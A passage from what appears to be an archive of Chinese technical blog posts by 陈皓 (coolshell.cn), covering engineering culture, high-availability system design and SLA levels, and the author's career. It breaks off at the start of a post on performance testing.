所以，如果你的精神不自由，你很难跳出老的思维模式，你用老的思维模式你一定不会想到新的方法和方式，如果不是对效率的提升，这个创新可能会不接地气。

因此，我认为，工程师文化就是自由加效率！

#### 自由

首先，工程师文化意味的创新文化，工程师都是有创新冲动的人，因为手里有创造技能的人通常都会有想创造点什么的冲动。而创新的源泉水来源于精神的解放，精神自由才会引发各式各样的奇思怪想，才会有常人觉得不可能的疯狂想法和想像力，而这些想法和想像力导致了创新。

精神上的自由具体表现在：

- **自我驱动**。自己管理自己是最好的管理。最失败的管理就是家长和保姆式的管理。兴趣出发的工作才可能迸发出真正的动力。

- **灵活的工作时间和地点**。工程师们更多的是脑力工作，而不是体力工作，工作上时间和地点的自由安排可以让工程师们的脑力工作更有效。Remote是一个很不错的工作方式，开源社区基本上都是这钟方式。和Remote有关的话题可参看37Signals的这本书《[Remote](https://book.douban.com/subject/25861795/)》

- **信息平等**。这意味着，全体员工得到的是原始信息，而不是被管理者们层层加工消化后的信息，信息的屏蔽很容易造成误解和完全错误的行为。信息的平等，大的包括战略、方向、目标、财务，小的包括文档、代码、和知识的共享等。同样，也表现在意见表达上，任何人都有可能表达自己的意见和建议的平等机会，这样才会激发出更多的思路和思辩，从而有不同的更好的思路出现。而不是，大家都看到了问题，而没有人敢说。在Google除了代码全员共享，还有Thanks God, It’s Friday的文化，每周五，高管们会出来，任员工提各种尖锐的问题，在Amazon，代码和文档基本上全员开放，包括财务报表也对员工开放，另外，除了所有的NB的Principle SDE隔三岔五都会有一个Principle Talk（有很多Talk相当令人开脑洞），还有Amazon内部的Up the River文化，每年会选出一批公司最聪明最有想法的人集思会，讨公司下一步的和战略，并可以把相应的KPI直接按给Senior VP。

- **不害怕错误**。处理错误的正确的姿势是分析总结教训，而不是惩罚故障人。前者让人改善进步，后者让人萎缩不前。最大的错误就是不敢犯错，最大的问题就是不敢直面问题。

- **宽松的审批系统甚至没有审批系统**。审批通常暗示着三件事，1）对人的不完全信任，2）繁琐的流程，3）思维上的束缚。这些都是创新和想像力的天敌。一个公司的监管、审批、流程越重，这个公司的活力也就越差。

- **20%的自由时间**。这是Google公司提出来的，员工有20%自由的时间做自己想做的项目，Gmail就是这么出来的。

#### 效率

工程师天生是追求效率的。有人说认为程序员花大量的时间做自动化的工具，还不如人肉的效率高，比如，写自动化的脚本花5个小时，而重复做这件事200次只花3个小时。有这样的理解的人根本不懂工程。

一方面，这个工具可以共享重用，更多的人可以从中受益，这次我花5个小时开发这个工具，下次只用1小时改一下就可以用在别的地方，这是着眼于未来而不是眼下的成本。更重要的是，这是一种文化，一种提高效率的文化，他会鼓励和激发出更多的这样的事情发生。**如果你因为一个程序员花大量的时间开发自动化的工具，而认为这个程序员没有效率，对之批评甚至惩罚的话，那么你就扼杀了提高效率的文化**（关于效率，大家可以看看我的另一篇文章《[关于加班和效率](https://coolshell.cn/articles/10217.html)》，你会真正了解什么是效率）

**人类之所以比别的动物聪明就是会使用和发明工具**，而古语也有云：“工欲善其事，必先利其器”，看看美军的装备你就知道战争工具的好坏有多重要了，**一个公司的强大之处在执行力，而执行力的强大之处在于你有什么样的支持工具。这些，已经不是工程师文化，而是人类发展的文化**。

针对于工程师文化来说，尤其是软件工程，提升工程效率的具体表现如下：

- **简化**。简化不是简陋，简单的东西通常意味着用户更好理解，也意味着更容易的维护和运维。就像阿里推行的“小而美”，就像乔布期推崇的“没有产品手册简单易用的产品”，就像Amazon推行的Working Backwards里说的那样，一个新的产品或功能，产品经理需要写三个文档：媒体公关文、用户手册、常见问题，三个文档总共加起来不超过两页A4纸，且不准用任何图片说明，目的就是为了让产品简化和容易使用。

- **残酷无情的推行自动化**。编写程序的最本质的目的就是自动化，看看人类发展史上自动化了多少东西。**对于自动化来说，不仅仅只是消除人肉的重复劳动，更重要的是，很多事情人完全干不过机器。**比如：加一台机器，程序在秒级就可以完成，而人是永远不可能达到这样的速度的，再比如：电商中用程序管理数量巨大的订单的自动化系统，加再多的人都完成的不可能像机器那样完成的又好又快。自动化需要大力开发提高生产力的工具，比如：持续集成，持续部署，自动化运维，基础自动化运维，甚至自动化的运营工具。（Amazon的软件工程中对自动化和简代相当迷恋）

- **避免无效率的组织架构和无效率的管理**。这体现在这些方面：1）扁平化的组织架构，2）努力用自动化工具取代支持型的工作，3）不超过10个人的全栈小团队，4）不按人员的技能分工而是按其负责的产品或功能分工（关于分工，请参看《[让我们来谈谈分工](https://coolshell.cn/articles/17295.html)》），5）开会不是解决问题，开会是表决提案，6）通过产品的目标或信条Tenets来减少沟通和决策过程（Amazon里的每个部门，每个团队，每个产品都有自己的Tenets，这个Tenets标明了要什么不要什么，这样可以避免很多扯皮和难缠的trade-off的决择，比如：AWS的几个信条：运维是最高优级的——这意味着只要是会让运维变得复杂的需求都可能会工程团队被拒掉，Throughput & Latency不能更差——这意味着，功能要为性能让路，因为性能变差了，用户就要买更多的资源）

- **正确的组件抽象**。抽象是简化的一部份，一方面，抽象意味着重用和通用，另一方面抽象意味着强大的扩展性，以适配各种可能性。最重要的是，抽象意味着技术能力的输出，无论是内部的其它团队还外部的团队。比如：Google的MapReduce/BigTable/ProtoBuffer，FaceBook的Thrift，还有Amazon内部的WebService框架Coral Service、处理日志监控的Timber，以及全线AWS产品都用到的Amazon Lock Framework（一个分布式锁框架）……

- **开发高质量的产品**。因为高质量的代码，不但可以容易的修改和维护，还可以因为少处理线上故障，从而有更多的时间去为未来做更多创造性的工作。这意味着需要有非常严谨的Design Review，Code Review，以及测试，关于Code Review，可以参看这篇文章《[从Code Review 谈如何做技术](https://coolshell.cn/articles/11432.html)》，关于严谨的测试，可以参看这篇文章《[如何做性能测试](https://coolshell.cn/articles/17381.html)》

- **不断的提高标准以及招聘最好的人**。取法其上，得乎其中，取法其中，得乎其下，取法其下，法不得也。如果一个公司或一个团队想变得越来越好，越来越强大的话，就必需要不断的提高自己的工作标准，提高工作标准意味着要不断地培养和招聘更好的人。在Amazon和Google的招聘官中都有一个叫Bar Rasier的人，这个人就是为了提高招聘标准而设立的。

- **创建一个持续改善的文化**。一个好的组织，一个好的团队，是需要不断反思前进的，这需要全体员工一起来的。微观层面上，在项目做完后需要有一个总结会分析项目中的得失，在故障出现后，需要有故障分析会，反思得失，在Amazon，严重的故障，需要写一个COE（Correction of Errors）的文档，其中有一节叫“Ask 5 Whys”，让你自己问自己至少5个为什么。在宏观层面，一个公司每年都应该做一定的工作数据分析或是员工调查，比如，是否招聘到了不错的人、工作的投入产出比，员工在哪些地方花时间了，等等，然后不断的用技术手段来改善。（Amazon每年的工程师员工调查表是我活那么大见过的最细最细的调查表了， 问题除了对公司、经理、文化的，还有从，日常工作、开发环境、持结集成，测试自动化、产品质量、软件架构、软件维护、线上问题处理、年度计划、数据仓库建设、通用工具投票……这个员工调查直接导致公司的对工程的投资方向）

#### 工程师文化如何落地

如果你要让任何文化在公司内得到执行，你有下面几个手段可以选择：

- **通过政治手段：你需要把住三个地方——招聘、绩效考核 & 升职**。比如，你要落地工程师文化中的简化和自动化，那你你在招聘的时候，你需要把懂简化和喜欢自动化的人招进来，然后在绩效考核和升职的地方设置上一条硬性指标——你今年简化了什么？自动化了什么？如果没有，对不起不但不能升职，绩效可能还不达标。

- **通过经济手段：让不做这事的成本 > 要做这个的成本。**然后，正常的人类都会选择成本低的方案。比如，如果你要推行Design/Code Review/UT以提高质量，你就把QA和OPS团队全挪到一边去，让Dev团队自己测试，自己负责，这样等这些Dev重复多次手动测试，处理多次线上的弱智故障，他们就会自然而然的写自动化测试和做Code Review了，而QA和OPS团队只是帮Dev你做工具罢了，而测试和运维的事全是你DEV的Ownership，出了故障也是Dev自己负责，于是，他们就会发现，不做Code Review和UT的成本远远大于做C Code Review/UT的成本，他们就会去做成本低的事的。

最后，工程师文化要落地，还有几个小条件，

- **第一，团队要小，Ownership很重要，Eat Your Own Dog Food。** 没有人帮你擦屁股，自己的屎自己吃，没有痛苦，不会产生想进步的动力。

- **第二，热爱学习和尝试**，学习尝试新的技术，开拓眼界，学习尝试新的思维方式，否则，呆在原地，原有的思维方式只会让你在原地打转转。

- **第三，老板更多的相信技术而不是管理**。相信技术会用技术来解决问题，相信管理，那就只会有制度、流程和价值观来解决问题。

#### 其它

说了这么多，时代还在发展，不过，这是我这么多年经历或看到的工程师文化的东西了。最后吐几个槽——

对于996和加班这个事，对于工程师来说从来都不是问题，在解决技术问题或是创造的时候，工程师是个很自觉的群体，基本不需要有别人驱动，工程师是最乐意Work Hard的人了。我相信几乎所有走上编程这个职业的人来说，基本上都是兴趣所至，觉得编程很有趣，但却被各个公司996搞得对编程毫无兴趣。为什么，你们这些公司要向中国的教育学习呢？人家本来对这事有比较高的兴趣的，但就是要通过考试/KPI/996这些东西把人家的兴趣一点一点的磨灭掉，把人变成机器、奴隶、牲口，**让人对学习和工作产生了厌倦和讨厌，会是你们这些管理者们所希望的？是不是只有把人变得不思进取了，你们才会管理？**就像《[软件开发中的两种管理方式](https://coolshell.cn/articles/4951.html)》中说的第一种人一样？

另外，我不知道，为什么我一说这些东西，就会有很多人（包括程序员自己）来和我说我是个理想主义者，这些已经不是什么理想了，已被很多成功的公司用了很多很多年了。只是你没有见到过罢了。还有的人说，因为中国的国情不同。这更让我费解了。这让我想到了当年大清朝派了一堆人出国考察后回来后，说外国的那套共和的东西不符合中国国情，最终也在历史的潮流中被淹没掉了。另外，什么叫“中国的国情不同”？中国有全世界数一数二的互联网用户，也有全世界数一数二的市场，不再是以前那个一穷二白的年代了，中国的国情到底有哪些不同呢？

我不知道各位工程师是为什么活的？但我觉得，**我们选择了一个刺激的职业，也赶上了这个行业大发展的时代，我们不妨扪心自问一下，你是否愿意让自己的能力、青春和热情就这样被磨灭了？**

（全文完）

# 关于高可用的系统

#####  [2016年08月21日 ](https://coolshell.cn/articles/17459.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [87 条评论](https://coolshell.cn/articles/17459.html#comments) 146,970 人阅读

![HighAvailability-BK](photo/HighAvailability-BK-300x300.png)在《[这多年来我一直在钻研的技术](https://coolshell.cn/articles/17446.html)》这篇文章中，我讲述了一下，我这么多年来一直在关注的技术领域，其中我多次提到了工业级的软件，我还以为有很多人会问我怎么定义工业级？以及一个高可用性的软件系统应该要怎么干出来？这样我也可以顺理成章的写下这篇文章，但是没有人问，那么，我只好厚颜无耻的自己写下这篇文章了。哈哈。

另外，我在一些讨论高可用系统的地方看到大家只讨论各个公司的技术方案，**其实，高可用的系统并不简单的是技术方案，一个高可用的系统其实还包括很多别的东西，所以，我觉得大家对高可用的系统了解的还不全面，为了让大家的认识更全面，所以，我写下这篇文章**。

目录



[理解高可用系统](https://coolshell.cn/articles/17459.html#理解高可用系统)[高可用系统的技术解决方案](https://coolshell.cn/articles/17459.html#高可用系统的技术解决方案)[高可用技术方案的示例](https://coolshell.cn/articles/17459.html#高可用技术方案的示例)[高可用性的SLA的定义](https://coolshell.cn/articles/17459.html#高可用性的SLA的定义)[影响高可用的因素](https://coolshell.cn/articles/17459.html#影响高可用的因素)[无计划的宕机原因](https://coolshell.cn/articles/17459.html#无计划的宕机原因)[有计划的宕机原因](https://coolshell.cn/articles/17459.html#有计划的宕机原因)[真正决定高可用系统的本质原因](https://coolshell.cn/articles/17459.html#真正决定高可用系统的本质原因)[其它](https://coolshell.cn/articles/17459.html#其它)

#### 理解高可用系统

首先，我们需要理解什么是高可用，英文叫High Availability（[Wikipedia词条](https://en.wikipedia.org/wiki/High_availability)），基本上来说，就是要让我们的计算环境（包括软硬件）做到full-time的可用性。在设计上一般来说，需要做好如下的设计：



1. 对软硬件的冗余，以消除单点故障。任何系统都会有一个或多个冗余系统做standby
2. 对故障的检测和恢复。检测故障以及用备份的结点接管故障点。这也就是failover
3. 需要很可靠的交汇点（CrossOver）。这是一些不容易冗余的结点，比如域名解析，负载均衡器等。

听起似乎很简单吧，然而不是，细节之处全是魔鬼，冗余结点最大的难题就是对于有状态的结点的数据复制和数据一致性的保证（无状态结点的冗余相对比较简单）。冗余数据所带来的一致性问题是魔鬼中的魔鬼：

- 如果系统的数据镜像到冗余结点是异步的，那么在failover的时候就会出现数据差异的情况。

- 如果系统在数据镜像到冗余结点是同步的，那么就会导致冗余结点越多性能越慢。

所以，很多高可用系统都是在做各种取舍，这需要比对着业务的特点来的，比如银行账号的余额是一个状态型的数据，那么，冗余时就必需做到强一致性，再比如说，订单记录属于追加性的数据，那么在failover的时候，就可以到备机上进行追加，这样就比较简单了（阿里目前所谓的异地双活其实根本做不到状态型数据的双活）。

下面，总结一下高可用的设计原理：

- 要做到数据不丢，就必需要持久化
- 要做到服务高可用，就必需要有备用（复本），无论是应用结点还是数据结点
- 要做到复制，就会有数据一致性的问题。
- 我们不可能做到100%的高可用，也就是说，我们能做到几个9个的SLA。

#### 高可用系统的技术解决方案

我在《[分布式系统的事务处理](https://coolshell.cn/articles/10910.html)》中引用过下面这个图：这个图来自来自：Google App Engine的co-founder Ryan Barrett在2009年的Google I/O上的演讲《[Transaction Across DataCenter](http://snarfed.org/transactions_across_datacenters_io.html)》（视频： [http://www.youtube.com/watch?v=srOgpXECblk](https://www.youtube.com/watch?v=srOgpXECblk)）

![Transaction Across DataCenter](photo/Transaction-Across-DataCenter-1684152838070-566.jpg)

这个图基本上来说是目前高可用系统中能看得到的所有的解决方案的基础了。M/S、MM实现起来不难，但是会有很多问题，2PC的问题就是性能不行，而Paxos的问题就是太复杂，实现难度太大。

总结一下各个高可用方案的的问题：

- 对于最终一致性来说，在宕机的情况下，会出现数据没有完全同步完成，会出现数据差异性。
- 对于强一致性来说，要么使用性能比较慢的[XA系](https://en.wikipedia.org/wiki/X/Open_XA)的两阶段提交的方案，要么使用性能比较好，但是实现比较复杂的Paxos协议。

注：这是软件方面的方案。当然，也可以使用造价比较高的硬件解决方案，不过本文不涉及硬件解决方案。

另外，现今开源软件中，很多缓存，消息中间件或数据库都有持久化和Replication的设计，从而也都有高可用解决方案，但是开源软件一般都没有比较高的SLA，所以，如果我们使用开源软件的话，需要注意这一点。

#### 高可用技术方案的示例

下面，我们来看一下MySQL的高可用的方案的SLA（下图下面红色的标识表示了这个方案有几个9）：

[![mysql-high-availability-solutions-feb-2015-webinar-9-638](photo/mysql-high-availability-solutions-feb-2015-webinar-9-638.jpg)](http://www.slideshare.net/andrewjamesmorgan/mysql-high-availability-solutions-feb-2015-webinar)

图片来源：[MySQL High Availability Solutions](http://www.slideshare.net/andrewjamesmorgan/mysql-high-availability-solutions-feb-2015-webinar)

简单解释一下MySQL的这几个方案（主要是想表达一个越多的9就越复杂）

- MySQL Repleaction就是传统的异步数据同步或是半同步Semi-Sync（只要有一个slave收到更新就返回成功）这个方式本质上不到2个9。
- MySQL Fabric简单来说就是数据分片下的M/S的读写分离模式。这个方案的的可用性可以达到99%
- DRBD通过底层的磁盘同步技术来解决数据同步的问题，就是RAID 1——把两台以上的主机的硬盘镜像成一个。这个方案不到3个9
- Solaris Clustering/Oracle VM ，这个机制监控了包括硬件、操作系统、网络和数据库。这个方案一般会伴随着节点间的“心跳机制”，而且还会动用到SAN（Storage Area Network）或是本地的分布式存储系统，还会动用虚拟化技术来做虚拟机的迁移以降低宕机时间的概率。这个解决方案完全就是一个“全栈式的解决方案”。这个方案接近4个9。
- MySQL Cluster是官方的一个开源方案，其把MySQL的集群分成SQL Node 和Data Node，Data Node是一个自动化sharing和复制的集群NDB，为了更高的可用性，MySQL Cluster采用了“完全同步”的数据复制的机制来冗余数据结点。这个方案接近5个9。

那么，这些2个9，3个9，4个9，5个9是什么意思呢？又是怎么来的呢？请往下看。

#### 高可用性的SLA的定义

**上面那些都不是本文的重点，本文的重点现在开始，如何测量系统的高可用性**。当然是SLA，全称[Service Level Agrement](https://en.wikipedia.org/wiki/Service-level_agreement)，也就是有几个9的高可用性。

工业界有两种方法来测量SLA，

- 一个是故障发生到恢复的时间
- 另一个是两次故障间的时间

但大多数都采用第一种方法，也就是故障发生到恢复的时间，也就是服务不可用的时间，如下表所示：

| 系统可用性%    | 宕机时间/年 | 宕机时间/月 | 宕机时间/周 | 宕机时间/天 |
| :------------- | :---------- | :---------- | :---------- | :---------- |
| 90% (1个9)     | 36.5 天     | 72 小时     | 16.8 小时   | 2.4 小时    |
| 99% (2个9)     | 3.65 天     | 7.20 小时   | 1.68 小时   | 14.4 分     |
| 99.9% (3个9)   | 8.76 小时   | 43.8 分     | 10.1 分钟   | 1.44 分     |
| 99.99% (4个9)  | 52.56 分    | 4.38 分     | 1.01 分钟   | 8.66 秒     |
| 99.999% (5个9) | 5.26 分     | 25.9 秒     | 6.05 秒     | 0.87 秒     |

比如，99.999%的可用性，一年只能有5分半钟的服务不可用。感觉很难做到吧。

**就算是3个9的可用性，一个月的宕机时间也只有40多分钟，看看那些设计和编码不认真的团队，把所有的期望寄托在人肉处理故障的运维团队， 一个故障就能处理1个多小时甚至2-3个小时，连个自动化的工具都没有，还好意思在官网上声明自己的SLA是3个9或是5个9，这不是欺骗大众吗？**。

#### 影响高可用的因素

老实说，我们很难计算我们设计的系统有多少的可用性，因为影响一个系统的因素实在是太多了，除了软件设计，还有硬件，还有每三方的服务（如电信联通的宽带SLA），当然包括“建筑施工队的挖掘机”。所以，正如SLA的定义，**这不仅仅只是一个技术指标，而是一种服务提供商和用户之间的contract或契约**。**这种工业级的玩法，就像飞机一样，并不是把飞机造出来就好了，还有大量的无比专业的配套设施、工具、流程、管理和运营**。

简而言之，SLA的几个9就是能持续提供可用服务的级别，不过，工业界中，会把服务不可用的因素分成两种：一种是有计划的，一种是无计划的。

##### 无计划的宕机原因

下图来自Oracle的 《[High Availability Concepts and Best Practices](https://docs.oracle.com/cd/A91202_01/901_doc/rac.901/a89867/pshavdtl.htm)》

 

##### ![unplaned_downtime](photo/unplaned_downtime.gif)有计划的宕机原因

下图来自Oracle的 《[High Availability Concepts and Best Practices](https://docs.oracle.com/cd/A91202_01/901_doc/rac.901/a89867/pshavdtl.htm)》

![planned_downtime](photo/planned_downtime.gif)

 

我们可以看到，上面的宕机原因包括如下：

无计划的

- 系统级的故障 –  包括主机、操作系统、中间件、数据库、网络、电源以及外围设备
- 数据和中介的故障 – 包括人员误操作、硬盘故障、数据乱了
- 还有：自然灾害、人为破坏、以及供电问题。

有计划的

- 日常任务：备份，容量规划，用户和安全管理，后台批处理应用
- 运维相关：数据库维护、应用维护、中间件维护、操作系统维护、网络维护
- 升级相关：数据库、应用、中间件、操作系统、网络、包括硬件升级

#### 真正决定高可用系统的本质原因

从上面这些会影响高可用的SLA的因素，你看到了什么？如果你还是只看到了技术方面或是软件设计的东西，那么你只看到了冰山一角。我们再仔细想一想，**那个5个9的SLA在一年内只能是5分钟的不可用时间，5分钟啊，如果按一年只出1次故障，你也得在五分钟内恢复故障，让我们想想，这意味着什么？**

**如果你没有一套科学的牛逼的软件工程的管理，没有牛逼先进的自动化的运维工具，没有技术能力很牛逼的工程师团队，怎么可能出现高可用的系统啊**。

是的，**要干出高可用的系统，这TMD就是一套严谨科学的工程管理**，其中包括但不限于了：

- 软件的设计、编码、测试、上线和软件配置管理的水平
- 工程师的人员技能水平
- 运维的管理和技术水平
- 数据中心的运营管理水平
- 依赖于第三方服务的管理水平

深层交的东西则是——对工程这门科学的尊重：

- 对待技术的态度
- 一个公司的工程文化
- 领导者对工程的尊重

**所以，以后有人在你面前提高可用，你要看的不是他的技术设计，而还要看看他们的工程能力，看看他们公司是否真正的尊重工程这门科学**。

#### 其它

有好些非技术甚至技术人员和我说过，做个APP做个网站，不就是找几个码农过来写写代码嘛。等系统不可用的时候，他们才会明白，要找技术能力比较强的人，但是，**就算你和他们讲一万遍道理，他们也很难会明白写代码怎么就是一种工程了，而工程怎么就成了一门科学了。其实，很多做技术的人都不明白这个道理**。

包括很多技术人员也永远不会理解，为什么要做好多像Code Review、自动化运维、自动化测试、持续集成之类这样很无聊的东西。就像我在《[从Code Review 谈如何做技术](https://coolshell.cn/articles/11432.html)》中提到的，阿里很多的工程师，架构师/专家，甚至资深架构师都没有这个意识，当然，这不怪他们，因为经历决定思维方式，他们的经历的是民用级的系统，做的都是堆功能的工作，的确不需要。

看完这些，最后让我们都扪心自问一下，你还敢说你的系统是高可用的了么？ ;-)

（全文完）

# 这多年来我一直在钻研的技术

#####  [2016年08月18日 ](https://coolshell.cn/articles/17446.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [134 条评论](https://coolshell.cn/articles/17446.html#comments) 165,598 人阅读

![Architecture Internships Abroad](photo/Architecture-Internships-Abroad-300x215.jpg)因为我是看到tinyfool 《[那些年我赶过的时髦技术趋势](https://weibo.com/ttarticle/p/show?id=2309404009795043653572)》，在赞叹的时候，也让我对我有好些回忆，所以想写一篇回忆贴，本来觉得回忆是件挺让人沮喪的事，因为是老了的表现，但我写着写着，就歪了楼。看来，我还不老，还在拼博。下面是很多我的唠叨，你喜欢就读读，不喜欢就TLDR – Too Long, Don’t Read!

自从98年毕业，到今天，参加工作有18个年头了，加上在大三的时候就为两个在外面接活的老师程序，到今天，写的程序被用到生产线也有18个年头了。

#### 背景经历

要说明我技术上的“性取向”，还得我说说的我的一些背景和经历。

我这18年，大约分三个阶段：

- 1996年-2000年

  ：

  入门乱来期

  ，大三大四加在银行工作的两年。

  - 用Powerbuilder/Delphi在WindowsNT/SQL Server上做了好多个MIS管理软件，有酒店的，有送水的，有OA的。
  -  用Java的Applet做了一个Web的教学课件，用于在Win95/IE3.0中演示操作系统中的各种调度和算法的动画，得了个全国大学生挑战者杯的鼓励奖。
  -  用Delphi的ISAPI技术以及PHP/ASP给一些公司和大学做过几个网站。



- 2000年-2010年

  ：

  技术学习期

  ，这十年，我主要的编程语言是C/C++。

  - 前两年在银行用C语言在Unix（AIX/Solaris/Sco Unix/HP-UX..）写各种银行业务（用C语言写），用C写操作SQL，操作界面，写业务交易逻辑，一切都用C……，这是一个C语言的年代，**当时，全国的银行都在做大集中，银行是当时行业里最大的软件系统了，所以，我确定了C/C++/Unix的技术方向**，我当时的网上签名是，*C/C++/Unix才是大规模杀伤性武器*。
  - 然后，2002年在Platform做一个全平台的（包括Unix/Linux/Windows）高性能计算的软件产品，很像今天的Hadoop，当时叫Grid Computing，主要用低廉的x86集群进行大规模的并行计算，主要用于芯片设计行业，如：ARM和德州仪器，或是科研，如NASA，或是国家安全，如美国国防部的影像分析，或是3D动画渲染，如怪物史瑞克……从05年以后，发现很多用户开始从Unix迁移到Linux，于是开始更为关注Linux的Kernel知识。**Platform有一套很严谨的软件工程体系，我对严谨的软件工程以及很多的基础的技术的认识在这里形成**。
  - 2007年在路透做路透全球金融数据Real-Time网络的高性能调优（我在《[性能测试应该怎么做？](https://coolshell.cn/articles/17381.html)》一文中透露过这个公司的性能要求，是一个实时的数据网络，对于99.9%的网络传输在100K的tps下要低于1ms，技术挑战是很大的），在路透，我只干一个事，就是性能优化，我把我负责的几个系统的性能都提升了8倍到15倍的样子，09年年底的时候，我已把未来3年的优化的活都干完了。所以，这个时期，我也开始了我的经理生涯。**我对性能调优，高可用系统架构，研发管理的很多是在这里形成的。**

- 2010年到今天

  ，

  技术沉淀期

  ，这个时间段，主要的编程语言是Java。

  - 这段时间，我加入了Amazon和Alibaba，也就是所谓的互联网公司。在Amazon干了两个事，一个是把Amazon全球的marketplace连起来，跨大洲的数据中心的通信，还有一个是第一次接触大数据和机器学习——用户需求预测系统。在Alibaba干过电商云平台聚石塔和阿里云，去阿里最主要的是经历双十一。
  - 这段时间，对我影响比较大的是Amazon，技术不再是我的瓶颈，大规模的系统，对我也不是问题，而让我收获最大的是，**世界前沿的软件设计架构和解决方案，以及做技术的态度和工程的方法，我的眼界、脑洞和视野都巨大的打开，并且在技术管理、工程管理、产品管理、人员管理、公司管理等等管理方面的思维有了质的提升**。这段时间，才是我真正技术沉淀的时期。

我的这个背景本来可以更好一些，只可惜运气不太好，本来可以走的更快的，无奈在最关键的时候遇到了两次金融危机，本来可以去硅谷更牛更好的公司见世面，无奈父母身体欠安，只能放弃。

#### 经历决定思维方式

通过我的背景经历，大家不难看到，我基本上都是做一些规模比较大的系统和软件，而且，主要用C/C++/Unix/Linux这样比较晦涩的语言和操作系统。我们知道用C和C++开发，基本上要处理的错误都是和系统底层相应的东西，而上规模的系统和软件，又总是会遇到很多“稀奇古怪”的问题，这些问题，都会逼着我要去了解很多的操作系统、计算机系统、网络、数据库、中间件等等的各种基础或底层技术。

而且我经历的基本上都是非常严谨的软件工程，不能马虎，我有几次马虎的经历，给我造成了非常大的心理影响，比如，曾经被定性为不适合写代码，因为我的代码太烂，或是出了严重的故障，几乎要跑路去了。另外，全球gloabl式的oncall，经常让我在凌晨被电话叫起来解决问题，这个经历比较痛苦。所以，**我的整个经历，让我养成了，在软件开发上必需也不得不严谨的习惯和价值观体系**。

**大家想想，用C/C++开发一个几乎不能出故障的软件系统，你需要多仔细和多严谨的态度才能达到要求？**因此，我的经历让我不能马虎，也不能应付工作，更不能在标准上有所妥协，还需要不断地提高标准，所以，时间一长，我必然，会有如下的习惯：

- **要做到——知其然，知其所以然**。所以，只能不断的学习基础知识以及和这个技术关联的知识，就像Wikipeida一样，当你进入一个词条的时候，就会伴随时一堆新词条，于是，当多年后，我看到 “**[知识广度是深度的副产品](https://coolshell.cn/articles/4235.html)**”这句话时，简直就是说到我的心里去了。

- **要做出工业级的软件**。从银行到Platform到Thomson Reuters再到Amazon，软件开发上都会有SLA的要求。我认为，一个软件是工业级还是民用级的，除了功能正确之外，最重要的一个指标之一就是在性能和稳定性上有没有SLA。绝大多数的互联网公司和开源软件都没有SLA。所以，达不到工业级的标准。**要达到工业级的标准，就需要花费时间、人力和财力进行非常繁琐的设计、测试评估以及运维管理**。

- 工业级的软件来自工业级专业人员和专业软件工程

  。

  - **专业的人员**。为什么绝大多数的外国公司需要的是CS（Computer Science）背景毕业的工程师？因为他们要做的是工业级的软件，这是一门科学，即然是科学，就需要受过良好的科学教育的CS专业的人。
  - **专业的工程**。工业级的软件需要有工业级的软件工程，比如，严谨的Design/Code Review，严格的测试，以及完备的线上运维。
  - **专业的工具**。这个时候，你就会发现，要做到高级别的SLA，比如包括5个9以上的SLA，人肉干活的能力已经完全跟不上了，你需要大量的专业的与之配套工具。**人类之所以聪明是因为会发明工具，所以，这也是工业级的另一个标准——你有多少现代化的支撑工具？**

在之前的《[开发团队的效率](https://coolshell.cn/articles/11656.html)》一文中，我说过——**你总需要在一个环节上认真，这个环节越往前就越有效率，越往后你就越没效率**。要么你设计和编码认真点，不然，你就得在测试上认真点。要是你设计、编码、测试都不认真，那你就得在运维上认真，就得在处理故障上认真。你总需要在一个地方认真。

认真是痛苦和艰难的，也是需要苦苦坚持的，因为人太容易妥协了，这对每个人来说都是一种不小的挑战。老实说，**我与很多人对“认真”的标准不一样，所以，产生了很多分歧，很多人说我太理想了。其实，我能理解他们，一方面是因为我的标准是比较高了，另一方面是他们只做过民用级的软件。**

另外，在一开始，做惯了工业级软件的我极度地不适应于那些糙快猛的开发方式。不过，我也在调整自己，毕竟，世界不只一种价值观，有的是工业级的软件，有的则是民用级的，还有的只是个玩具，而且还有Java这门语言非常有效地屏蔽了很多底层和基础知识，所以，也不可一概而论，我也在适应一些民用级的软件开发的方式。

#### 后记

从去年我从阿里离开到现在14个月了，这段时间内，我给大约40多家公司做过相应的技术咨询和解决过很多技术问题，绝大多数公司都是因为性能和稳定性的问题来找我的，我给这些公司解决问题的时候，基本都是这样的Pattern：

- 一开始，发现都是一些技术知识点的问题，
- 然后，马上进入到系统架构方面方面的问题，
- 当再解决架构问题的时候，我发现，已经是软件工程的问题，
- 而软件工程问题的后面，又是公司管理上的问题
- 而公司管理的问题，结果又到了人的问题上
- 而人的问题，又到了公司文化的问题……

你看，很多问题，一环扣一环，最终都不是一个简单的技术问题。我倒不是说，我在抱怨这些问题，我更不是在说能解决这些问题，因为，就像软件工程没有银弹一样，无论你给什么样的解决方案都会有问题，没有问题才是不科学的。我能做的是，观察这个公司的业务形态、和相关的思维方式，以及现有的资源和相应的技术实力，帮助他们从技术到管理上缓解或改善现有的问题。

所以，我基本上来说，这近20年来，**我只在专心研究一个事——如何做出一个性能高稳定性好的大规模的系统。**在这个方向中，除了很多的基础和底层技术我需要吃透，我还需要在软件的开发工艺，软件工具，以及软件的线上运维，以及相关的管理上不断学习和思考，**因为，只有技术、工具、工程、运维、人员这几个方面搞好了，才可能出现一个性能高且稳定性好的系统**。

之前对于我来说，我一直在鼓吹先进的管理和软件工程以及技术和工具。今天，对我来说，遇到最大的问题就是，在没有这些所谓的先进的东西的时候，除了我自己上手外，我是否还能解决相应的问题？因为我自己已经完全Scale不开了。

有问题就有挑战，我每天都在思考，如何在不完美甚至残缺的环境下，解决这些公司的技术问题。每个人都要给自己一个目标。目前，我给自己的目标是——**在残缺的环境下，能让用户不改一行代码，不动任何的架构，不改变用户很糟糕的软件开发的习惯，也不让用户作任何管理上的调整，能提升用户的软件系统的性能和稳定性**。

因为我相信技术，我相信有更好的技术，可以为用户完全透明的提升性能和稳定性，我大致找到了相应的解，现在，我正在实践的路上，这也许是笔大买卖，所以我不知天高地厚地注册了自己的公司……

（全文完）

# 性能测试应该怎么做？

#####  [2016年07月06日 ](https://coolshell.cn/articles/17381.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [77 条评论](https://coolshell.cn/articles/17381.html#comments) 117,421 人阅读

![PerfTest](photo/PerfTest.png)偶然间看到了阿里中间件[Dubbo的性能测试报告](http://dubbo.io/User+Guide-zh.htm#UserGuide-zh-性能测试报告)，我觉得这份性能测试报告让人觉得做这性能测试的人根本不懂性能测试，我觉得这份报告会把大众带沟里去，所以，想写下这篇文章，做一点科普。

首先，这份测试报告里的主要问题如下：

